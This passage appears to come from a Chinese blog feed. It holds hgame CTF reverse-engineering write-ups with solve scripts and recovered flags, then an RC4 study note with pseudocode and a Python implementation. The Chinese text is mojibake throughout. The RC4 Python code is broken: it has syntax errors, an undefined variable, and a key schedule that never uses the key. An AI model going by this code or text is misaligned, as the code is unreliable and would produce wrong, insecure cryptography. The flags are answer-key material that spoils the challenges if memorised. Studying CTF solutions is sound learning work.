class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">def encode():</span><br><span class="line">    s=<span class="string">'0f233e63637982d266cbf41ecb1b0102'</span></span><br><span class="line">    key=[<span class="string">'76'</span>,<span class="string">'60'</span>,<span class="string">'214'</span>,<span class="string">'54'</span>,<span class="string">'80'</span>,<span class="string">'136'</span>,<span class="string">'32'</span>,<span class="string">'204'</span>]</span><br><span class="line">    a1=[]</span><br><span class="line">    a2=[]</span><br><span class="line">    for i in range(<span class="number">0</span>,<span class="number">16</span>,<span class="number">2</span>):</span><br><span class="line">        a1.append(int(s[i:i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">        a2.append(int(s[<span class="number">16</span>+i:<span class="number">16</span>+i+<span class="number">2</span>],<span class="number">16</span>))</span><br><span class="line">    </span><br><span class="line">    for i in range(<span class="number">8</span>):</span><br><span class="line">        #print i</span><br><span class="line">        a1[i] = (((a1[i] &amp; <span class="number">0xE0</span>) &gt;&gt; <span class="number">5</span>) | <span class="number">8</span> * a1[i]) <span class="comment">%256    #a1å¾ªç¯å³ç§»3ä½</span></span><br><span class="line">                    </span><br><span class="line">        a1[i] = a1[i] ^ ((a2[<span class="number">7</span>-i] &amp; <span class="number">0xaa</span> ) &gt;&gt; <span class="number">1</span> ) </span><br><span class="line">                    </span><br><span class="line">        a2[<span class="number">7</span>-i] =  a2[<span class="number">7</span>-i] ^ ((a1[i] &amp; <span class="number">0x55</span>) &lt;&lt; <span class="number">1</span> )</span><br><span class="line">                    </span><br><span class="line">        a1[i] = a1[i] ^ ((a2[<span class="number">7</span>-i] &amp; <span class="number">0xaa</span>) &gt;&gt; <span class="number">1</span> ) </span><br><span class="line"></span><br><span class="line">    test=<span class="string">""</span> </span><br><span class="line">    for i in range(len(key)):</span><br><span class="line">        test+=chr(a1[i]^int(key[i]))</span><br><span class="line">    for i in range(len(key)):</span><br><span class="line">        test+=chr(a2[i]^a1[i])</span><br><span class="line">    print test</span><br><span class="line"></span><br><span class="line">encode()</span><br><span class="line"></span><br><span class="line"><span class="symbol">FLAG</span>=[]</span><br><span class="line">res14=[]</span><br><span class="line">res16=[]</span><br><span class="line">key=[<span class="string">'76'</span>,<span class="string">'60'</span>,<span class="string">'214'</span>,<span class="string">'54'</span>,<span class="string">'80'</span>,<span class="string">'136'</span>,<span class="string">'32'</span>,<span class="string">'204'</span>]</span><br><span class="line">flag=<span class="string">'e4sy_Re_Easylif3'</span>.encode(<span class="string">'hex'</span>)</span><br><span class="line">for i in range(<span class="number">0</span>,len(flag),<span class="number">2</span>):</span><br><span class="line">    <span class="symbol">FLAG</span>.append(flag[i:i+<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">for i in range(<span class="number">8</span>):</span><br><span class="line">    res14.append(int(key[i])^int(<span class="symbol">FLAG</span>[i],<span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">for i in range(<span class="number">8</span>):</span><br><span class="line">    res16.append(int(<span class="symbol">FLAG</span>[i+<span class="number">8</span>],<span class="number">16</span>)^int(res14[i]))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a1=[]</span><br><span class="line">a2=[]</span><br><span class="line">for i in range(<span class="number">8</span>):</span><br><span class="line">    a1.append(res14[i] ^ ((res16[<span class="number">7</span>-i] &amp; <span class="number">170</span>) &gt;&gt; <span class="number">1</span> ))</span><br><span class="line"></span><br><span class="line">for i in range(<span class="number">8</span>):</span><br><span class="line">    a2.append(res16[<span class="number">7</span>-i] ^ ((a1[i] &amp; <span class="number">85</span>) &lt;&lt; <span class="number">1</span> )<span class="comment">%256)</span></span><br><span class="line"></span><br><span class="line">a2.reverse()</span><br><span class="line"></span><br><span class="line">a1_1=[]</span><br><span class="line"></span><br><span class="line">for i in range(<span class="number">8</span>):</span><br><span class="line">    a1_1.append(a1[i] ^ ((a2[<span class="number">7</span>-i] &amp; <span class="number">170</span>) &gt;&gt; <span class="number">1</span> ))</span><br><span class="line"></span><br><span class="line">a_final=[]</span><br><span class="line">for i in range(<span class="number">8</span>):</span><br><span class="line">    ans=bin(a1_1[i])[<span class="number">2</span>:].rjust(<span class="number">8</span>,<span class="string">"0"</span>)</span><br><span class="line">    a_final.append(int(ans[<span class="number">5</span>:<span class="number">8</span>]+ans[<span class="number">0</span>:<span class="number">5</span>],<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">flag=<span class="string">"hgame&#123;"</span></span><br><span class="line">for i in a_final:</span><br><span class="line">    flag+=hex(i)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line">for i in a2:</span><br><span class="line">    flag+=hex(i)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">"0"</span>)</span><br><span class="line"></span><br><span class="line">flag+=<span class="string">"&#125;"</span></span><br><span class="line">print flag</span><br></pre></td></tr></table></figure><p>è¿è¡Œå¾—åˆ°flagï¼šhgame{0f233e63637982d266cbf41ecb1b0102}</p><h3 id="advance"><a href="#advance" class="headerlink" title="advance"></a>advance</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-19"><a href="#é¢˜ç›®ä»‹ç»ï¼š-19" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p> â€œé«˜çº§åŠ å¯†ç®—æ³•â€ </p><h4 id="è§£é¢˜æ€è·¯ï¼š-19"><a href="#è§£é¢˜æ€è·¯ï¼š-19" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>çœ‹é¢˜ç›®è¿˜ä»¥ä¸ºæ˜¯AESåŠ å¯†</p><p>é¦–å…ˆè¿è¡Œä¸‹ç¨‹åº</p><p><img src="https://i.loli.net/2020/05/01/fni1Mub3rqZ6yNW.png" alt="image-20200121171024621"></p><p>æ”¾è¿›idaï¼Œå‘ç°å»æ‰äº†ç¬¦å·è¡¨ï¼Œæ‰¾ä¸åˆ°mainå‡½æ•°ç”šè‡³</p><p>é‚£æˆ‘ä»¬å°±æŸ¥æ‰¾ä¸€ä¸‹â€˜try againâ€™å­—ç¬¦</p><p>å¾—åˆ°æ ¸å¿ƒä»£ç éƒ¨åˆ†</p><p>å¯ä»¥çœ‹åˆ°ï¼Œä¸è¾“å…¥æœ‰å…³çš„å‡½æ•°æœ‰ä¸‰ä¸ªï¼Œåˆ†åˆ«æ˜¯sub_140002030ï¼Œsub_140002000ï¼Œsub_140001EB0</p><p>ä½†æ˜¯ç¨å¾®æœ‰ç‚¹ç»éªŒï¼Œæˆ–è€…æ˜¯å®ç°è¿‡base64åŠ å¯†çš„é€‰æ‰‹å¾ˆå®¹æ˜“å°±èƒ½çœ‹å‡ºè¿™å°±æ˜¯ä¸ªbase64åŠ å¯†</p><p>æ‰€ä»¥è¿™ä¸ªåŠ å¯†å°±æ˜¯base64åŠ å¯†äº†ï¼Œè€Œè¿™é‡Œçš„aAbcdefghijklmnæ˜¾ç„¶å°±æ˜¯è¿™ä¸ªåŠ å¯†çš„å¯†ç è¡¨çš„</p><p>åŒå‡»å¾—åˆ°å¯†ç è¡¨ï¼š</p><p>æ˜¯å°†æ­£å¸¸çš„base64è¡¨æ¢äº†ä¸ªé¡ºåºï¼Œ</p><p>ç›´æ¥ç¼–å†™æˆ–è€…æ‰¾ä¸€ä¸ªbase64è§£å¯†è„šæœ¬å³å¯å¾—åˆ°flag</p><h4 id="exp-10"><a href="#exp-10" class="headerlink" title="exp"></a>exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64_decode</span><span class="params">(s, dictionary)</span>:</span></span><br><span class="line">    base64inv = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(dictionary)):</span><br><span class="line">        base64inv[dictionary[i]] = i</span><br><span class="line"></span><br><span class="line">    s = s.replace(<span class="string">"\n"</span>, <span class="string">""</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> re.match(<span class="string">r"^([&#123;alphabet&#125;]&#123;&#123;4&#125;&#125;)*([&#123;alphabet&#125;]&#123;&#123;3&#125;&#125;=|[&#123;alphabet&#125;]&#123;&#123;2&#125;&#125;==)?$"</span>.format(alphabet = dictionary), s):</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">"Invalid input: &#123;&#125;"</span>.format(s))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(s) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">""</span></span><br><span class="line">    p = <span class="string">""</span> <span class="keyword">if</span> (s[<span class="number">-1</span>] != <span class="string">"="</span>) <span class="keyword">else</span> <span class="string">"AA"</span> <span class="keyword">if</span> (len(s) &gt; <span class="number">1</span> <span class="keyword">and</span> s[<span class="number">-2</span>] == <span class="string">"="</span>) <span class="keyword">else</span> <span class="string">"A"</span></span><br><span class="line">    r = <span class="string">""</span></span><br><span class="line">    s = s[<span class="number">0</span>:len(s) - len(p)] + p</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> range(<span class="number">0</span>, len(s), <span class="number">4</span>):</span><br><span class="line">        n = (base64inv[s[c]] &lt;&lt; <span class="number">18</span>) + (base64inv[s[c+<span class="number">1</span>]] &lt;&lt; <span class="number">12</span>) + (base64inv[s[c+<span class="number">2</span>]] &lt;&lt; <span class="number">6</span>) + base64inv[s[c+<span class="number">3</span>]]</span><br><span class="line">        r += chr((n &gt;&gt; <span class="number">16</span>) &amp; <span class="number">255</span>) + chr((n &gt;&gt; <span class="number">8</span>) &amp; <span class="number">255</span>) + chr(n &amp; <span class="number">255</span>)</span><br><span class="line">    <span class="keyword">return</span> r[<span class="number">0</span>:len(r) - len(p)]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(dictionary)</span>:</span></span><br><span class="line">    print(base64_decode(<span class="string">"0g371wvVy9qPztz7xQ+PxNuKxQv74B/5n/zwuPfX"</span>, dictionary), end=<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    dictionary = <span class="string">"abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span></span><br><span class="line">    show(dictionary)</span><br></pre></td></tr></table></figure><p>å¾—åˆ°flagï¼šhgame{b45e6a_i5_50_eazy_6VVSQ}</p><h3 id="cpp"><a href="#cpp" class="headerlink" title="cpp"></a>cpp</h3><h4 id="é¢˜ç›®ä»‹ç»ï¼š-20"><a href="#é¢˜ç›®ä»‹ç»ï¼š-20" class="headerlink" title="é¢˜ç›®ä»‹ç»ï¼š"></a>é¢˜ç›®ä»‹ç»ï¼š</h4><p> easy cpp hint: ç¿»å¼€çº¿ä»£è¯¾æœ¬çœ‹çœ‹ </p><h4 id="è§£é¢˜æ€è·¯ï¼š-20"><a href="#è§£é¢˜æ€è·¯ï¼š-20" class="headerlink" title="è§£é¢˜æ€è·¯ï¼š"></a>è§£é¢˜æ€è·¯ï¼š</h4><p>è¿™ä¸€é“é¢˜æ˜¯è¿è’™å¸¦çŒœçš„ä¸€é“é¢˜ï¼Œæœ¬èº«cppçš„é™æ€åˆ†æå°±å¾ˆéš¾çœ‹ï¼Œå‡ºé¢˜äººè¿˜å»æ‰äº†ç¬¦å·è¡¨ã€‚ï¼ˆè€Œä¸”æœ¬äººè¿˜æ²¡å­¦è¿‡cppï¼Œæ‰€ä»¥è¿™ä¸€é¢˜è®²å¾—ä¸ä¼šå¾ˆæ¸…æ¥šï¼‰</p><p>è‡ªå·±ä¹Ÿæ˜¯åˆšæ¥è§¦äºŒè¿›åˆ¶ï¼ŒåŠ¨æ€è°ƒè¯•ä¹Ÿä¸å¤ªä¼šï¼Œæ‰€ä»¥ã€‚ã€‚ã€‚ã€‚</p><p><img src="https://i.loli.net/2020/05/01/X2CI93SYHnK6zDE.png" alt="img"></p><p>æ‰€ä»¥æˆ‘ä»¬è§£å¯†åªéœ€è¦å…ˆæ±‚å‡ºçŸ©é˜µv21çš„é€†çŸ©é˜µ</p><p>æ¨èä¸€ä¸ªåœ¨çº¿çŸ©é˜µè¿ç®—çš„<a href="https://matrixcalc.org/zh/" target="_blank" rel="noopener">ç½‘ç«™</a></p><p><img src="https://i.loli.net/2020/05/01/sICPQybD3AHehFz.png" alt="img"></p><p>ç„¶åçŸ©é˜µv30å³ä¹˜è¿™ä¸ªçŸ©é˜µå°±å¯ä»¥å¾—åˆ°æˆ‘ä»¬åº”è¯¥çš„è¾“å…¥çŸ©é˜µ</p><p><img src="https://i.loli.net/2020/05/01/q9rdYcfiNSoJG4P.png" alt="img"></p><p>æ‰€ä»¥flagå°±æ˜¯ï¼š</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hgame&#123;<span class="number">-24840</span>_<span class="number">-78193</span>_51567_2556_<span class="number">-26463</span>_26729_3608_<span class="number">-25933</span>_25943&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> æ¯”èµ›å°å±‹ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Write Up </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¯†ç å­¦å­¦ä¹ ç¬”è®° ä¹‹ RC4ä¸SM4</title>
      <link href="/2020/01/30/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BRC4%E4%B8%8ESM4/"/>
      <url>/2020/01/30/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8BRC4%E4%B8%8ESM4/</url>
      
        <content type="html"><![CDATA[<h1 id="Rc4"><a href="#Rc4" class="headerlink" title="Rc4"></a>Rc4</h1><p>åœ¨ä»Šå¹´å¯’å‡hgame week2çš„å¯†ç å­¦ä¸­æœ‰ä¸€é“notRC4çš„é¢˜ç›®ï¼Œè¯´æ˜¯notRC4ï¼Œå…¶å®æ•´ä¸ªåŠ å¯†æµç¨‹è¿˜æ˜¯RC4ï¼Œæ‰€ä»¥å€Ÿæ­¤æœºä¼šå­¦ä¹ ä¸€ä¸‹RC4åŠ å¯†ã€‚</p><h2 id="Rc4ç®€ä»‹"><a href="#Rc4ç®€ä»‹" class="headerlink" title="Rc4ç®€ä»‹"></a>Rc4ç®€ä»‹</h2><p>â€‹        åœ¨å¯†ç å­¦ä¸­ï¼ŒRC4ï¼ˆæ¥è‡ªRivest Cipher 4çš„ç¼©å†™ï¼‰æ˜¯ä¸€ç§æµåŠ å¯†ç®—æ³•ï¼Œç”±äºåŠ è§£å¯†ä½¿ç”¨ç›¸åŒçš„å¯†é’¥ï¼Œå› æ­¤ä¹Ÿå±äºå¯¹ç§°åŠ å¯†ç®—æ³•ã€‚ä½†æ˜¯ç”±äºRC4ç®—æ³•å­˜åœ¨å¼±ç‚¹ï¼Œ2015å¹´2æœˆæ‰€å‘å¸ƒçš„ RFC 7465 è§„å®šç¦æ­¢åœ¨TLSä¸­ä½¿ç”¨RC4åŠ å¯†ç®—æ³•ã€‚</p><p>â€‹        RC4ç”±ä¼ªéšæœºæ•°ç”Ÿæˆå™¨å’Œå¼‚æˆ–è¿ç®—ç»„æˆã€‚RC4çš„å¯†é’¥é•¿åº¦å¯å˜ï¼ŒèŒƒå›´æ˜¯[1,255]ã€‚RC4ä¸€ä¸ªå­—èŠ‚ä¸€ä¸ªå­—èŠ‚åœ°åŠ è§£å¯†ã€‚ç»™å®šä¸€ä¸ªå¯†é’¥ï¼Œä¼ªéšæœºæ•°ç”Ÿæˆå™¨æ¥å—å¯†é’¥å¹¶äº§ç”Ÿä¸€ä¸ªSç›’ã€‚Sç›’ç”¨æ¥åŠ å¯†æ•°æ®ï¼Œè€Œä¸”åœ¨åŠ å¯†è¿‡ç¨‹ä¸­Sç›’ä¼šå˜åŒ–ã€‚</p><p>ç”±äºå¼‚æˆ–è¿ç®—çš„å¯¹åˆæ€§ï¼ŒRC4åŠ å¯†è§£å¯†ä½¿ç”¨åŒä¸€å¥—ç®—æ³•ã€‚</p><p> 2015å¹´ï¼Œæ¯”åˆ©æ™‚é­¯æ±¶å¤§å­¸çš„ç ”ç©¶äººå“¡Mathy VanhoefåŠFrank Piessensï¼Œå…¬å¸ƒäº†é‡å°RC4åŠ å¯†ç®—æ³•çš„æ–°å‹æ”»æ“Šç¨‹å¼ï¼Œå¯åœ¨75å°æ™‚å…§å–å¾—cookieçš„å…§å®¹ã€‚ </p><h2 id="RC4åŠ å¯†æµç¨‹"><a href="#RC4åŠ å¯†æµç¨‹" class="headerlink" title="RC4åŠ å¯†æµç¨‹"></a>RC4åŠ å¯†æµç¨‹</h2><h3 id="åˆå§‹åŒ–ç®—æ³•ï¼ˆKSAï¼‰"><a href="#åˆå§‹åŒ–ç®—æ³•ï¼ˆKSAï¼‰" class="headerlink" title="åˆå§‹åŒ–ç®—æ³•ï¼ˆKSAï¼‰"></a>åˆå§‹åŒ–ç®—æ³•ï¼ˆKSAï¼‰</h3><p>é¦–å…ˆç”Ÿæˆä¸€ä¸ªkeyï¼Œå†…å®¹éšä¾¿å®šä¹‰</p><p>ç„¶åå°†keyæ‹“å±•æˆ256ä½ï¼Œç”¨keyæœ¬èº«æ¥å¡«å……ï¼Œ</p><p>ä¸¾ä¸ªæ —å­ï¼šå¦‚æœé€‰æ‹©key=â€˜vanishâ€™,æ‹“å±•åçš„keyå³ä¸ºâ€˜vanishvanishvanishâ€¦â€¦vaniâ€™  (é•¿åº¦ä¸º256)</p><p>ç„¶åç”Ÿæˆä¸€ä¸ªSç›’ï¼ŒSç›’æœ‰256ä¸ªå…ƒç´ ï¼Œåˆ†åˆ«æ˜¯0ï¼Œ1ï¼Œ2ï¼Œâ€¦â€¦ï¼Œ255</p><p>æ¥ç€åˆ©ç”¨keyåˆå§‹åŒ–ï¼ˆæ‰“ä¹±ï¼‰Sç›’ï¼Œ</p><p>åˆå§‹åŒ–çš„ä¼ªä»£ç ï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">j </span>= <span class="number">0</span></span><br><span class="line">for( i=<span class="number">0</span> <span class="comment">; i&lt;256 ; i++)</span></span><br><span class="line">    <span class="keyword">j </span>= (<span class="keyword">j </span>+ S[i] + key[i]) % <span class="number">256</span></span><br><span class="line">    <span class="keyword">swap </span>(s[i],s[<span class="keyword">j])</span><span class="comment"># äº¤æ¢s[i]å’Œs[j]çš„å€¼ï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„Sç›’</span></span><br><span class="line">endfor</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œç”±äºæœªåˆå§‹åŒ–çš„Sç›’éƒ½æ˜¯ç¡®å®šçš„ï¼Œæ‰€ä»¥jå¯ä»¥çœ‹ä½œåªå—keyçš„å€¼çš„å½±å“ï¼Œå¹¶ä¸”jçš„å€¼å…·æœ‰â€œé—ä¼ æ€§â€ï¼Œå°±æ˜¯ä¼šå½±å“åé¢çš„jçš„å€¼ï¼Œæ‰€ä»¥ï¼Œå°±ç®—åªæ˜¯æ”¹åŠ¨keyçš„æŸä¸€ä¸ªå€¼ï¼Œç»è¿‡256æ¬¡å˜åŒ–åçš„Sç›’ä¹Ÿä¼šç”±å¾ˆå¤§ä¸åŒã€‚</p><p>æ•´ä¸ªåˆå§‹åŒ–æŠ½è±¡ä¸€ç‚¹è¿‡ç¨‹å°±æ˜¯ï¼ŒSç›’çš„æ¯ä¸€ä¸ªå…ƒç´ éƒ½ä¼šå’Œè‡ªèº«çš„æŸä¸€ä¸ªå…ƒç´ è¿›è¡Œäº¤æ¢ï¼Œè€Œå’Œè°äº¤æ¢åˆ™ç”±keyæ¥å†³å®š</p><h3 id="ä¼ªéšæœºå­å¯†ç ç”Ÿæˆç®—æ³•ï¼ˆPRGA-ã€åŠ å¯†é˜¶æ®µ"><a href="#ä¼ªéšæœºå­å¯†ç ç”Ÿæˆç®—æ³•ï¼ˆPRGA-ã€åŠ å¯†é˜¶æ®µ" class="headerlink" title="ä¼ªéšæœºå­å¯†ç ç”Ÿæˆç®—æ³•ï¼ˆPRGA)ã€åŠ å¯†é˜¶æ®µ"></a>ä¼ªéšæœºå­å¯†ç ç”Ÿæˆç®—æ³•ï¼ˆPRGA)ã€åŠ å¯†é˜¶æ®µ</h3><p>ä¼ªä»£ç ï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">j </span>= <span class="number">0</span></span><br><span class="line">for (i=<span class="number">0</span> <span class="comment">;i&lt;len(input);i++):</span></span><br><span class="line">    i = (i + <span class="number">1</span>) mod <span class="number">256</span>  </span><br><span class="line">    <span class="keyword">j </span>= (<span class="keyword">j </span>+ S[i]) mod <span class="number">256</span> <span class="comment">#jçš„å€¼å—Sç›’å½±å“</span></span><br><span class="line">    <span class="keyword">swap </span>(s[i],s[<span class="keyword">j])</span><span class="comment"># äº¤æ¢s[i]å’Œs[j]çš„å€¼ï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„Sç›’</span></span><br><span class="line">    k = input[i] ^ S[(S[i] + S[<span class="keyword">j]) </span>% <span class="number">256</span>]<span class="comment">#å¯¹æ˜æ–‡çš„ä¸€ä¸ªå­—èŠ‚è¿›è¡ŒåŠ å¯†</span></span><br><span class="line">    output K</span><br><span class="line">endwhile</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œä¼ªéšæœºçš„å­å¯†ç çš„ç”Ÿæˆåªå—åˆå§‹åŒ–åçš„Sç›’çš„å½±å“ï¼Œè¦åŠ å¯†çš„æ˜æ–‡å¹¶ä¸ä¼šå½±å“å¯†é’¥ã€‚</p><p>ä»è¿™é‡Œä¾¿å¯ä»¥çœ‹å‡ºRC4æ˜¯ä¸€ä¸ªå¯¹ç§°åŠ å¯†ï¼Œåªè¦æ‹¥æœ‰åˆå§‹åŒ–åçš„Sç›’ã€‚é‚£ä¹ˆå¯†é’¥ä¾¿æ˜¯å›ºå®šçš„ã€‚æ˜æ–‡æµå’Œå¯†é’¥æµå¼‚æˆ–å¾—åˆ°å¯†æ–‡æµï¼Œå¯†æ–‡æµå’Œå¯†é’¥æµå¼‚æˆ–ä¾¿å¾—åˆ°æ˜æ–‡æµã€‚</p><h2 id="pythonä»£ç å®ç°ï¼š"><a href="#pythonä»£ç å®ç°ï¼š" class="headerlink" title="pythonä»£ç å®ç°ï¼š"></a>pythonä»£ç å®ç°ï¼š</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#åˆ›å»ºSç›’</span></span><br><span class="line">s=[<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    s[i]=i</span><br><span class="line">    </span><br><span class="line"><span class="comment">#æ‹“å±•key</span></span><br><span class="line">key=<span class="string">""</span></span><br><span class="line">k=[<span class="number">0</span>]*<span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    k[i]=key[(i)mod(len(key)]</span><br><span class="line">    </span><br><span class="line"><span class="comment">#åˆå§‹åŒ–Sç›’</span></span><br><span class="line">j=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">j = (j+s[i]+s[j])%<span class="number">256</span></span><br><span class="line">    s[i],s[j] = s[j],s[i]</span><br><span class="line"></span><br><span class="line"><span class="comment">#ç”Ÿæˆå¯†é’¥ï¼ŒåŠ å¯†æ˜æ–‡  </span></span><br><span class="line">message=<span class="string">""</span> </span><br><span class="line">cipher</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(message))</span><br><span class="line">    i = (i + <span class="number">1</span>)%<span class="number">256</span> </span><br><span class="line">    j = (j + s[i])%<span class="number">256</span></span><br><span class="line">    s[i],s[j] = s[j],s[i]</span><br><span class="line">    t = (s[i] + s[j])%<span class="number">256</span></span><br><span class="line">    cipher += message[i]^s[t]</span><br></pre></td></tr></table></figure><h2 id="å®ä¾‹ï¼šhgame-week2-notRC4"><a href="#å®ä¾‹ï¼šhgame-week2-notRC4" class="headerlink" title="å®ä¾‹ï¼šhgame-week2 notRC4"></a>å®ä¾‹ï¼šhgame-week2 notRC4</h2><p>é¢˜ç›®ï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">from hashlib import md5</span><br><span class="line">from secret import flag</span><br><span class="line">assert flag.startswith(b<span class="string">'hgame) and flag.endswith(b'</span>)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Oo0</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(<span class="keyword">self</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        <span class="keyword">self</span>.O<span class="number">0</span> = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">        <span class="keyword">self</span>.Ooo = <span class="number">0</span></span><br><span class="line">        <span class="keyword">self</span>.Ooo<span class="number">0</span> = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">self</span>.O<span class="number">0</span>[i] = i</span><br><span class="line">        <span class="keyword">self</span>.oO<span class="number">0</span> = <span class="number">0</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">OO0</span><span class="params">(<span class="keyword">self</span>, oO<span class="number">0</span>)</span></span><span class="symbol">:</span></span><br><span class="line">        l = len(oO<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">self</span>.Ooo<span class="number">0</span>[i] = oO<span class="number">0</span>[i%l]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)<span class="symbol">:</span></span><br><span class="line">            <span class="keyword">self</span>.oO<span class="number">0</span> = ( <span class="keyword">self</span>.oO<span class="number">0</span> + <span class="keyword">self</span>.O<span class="number">0</span>[i] + <span class="keyword">self</span>.Ooo<span class="number">0</span>[i] ) % <span class="number">256</span></span><br><span class="line">            <span class="keyword">self</span>.O<span class="number">0</span>[i], <span class="keyword">self</span>.O<span class="number">0</span>[<span 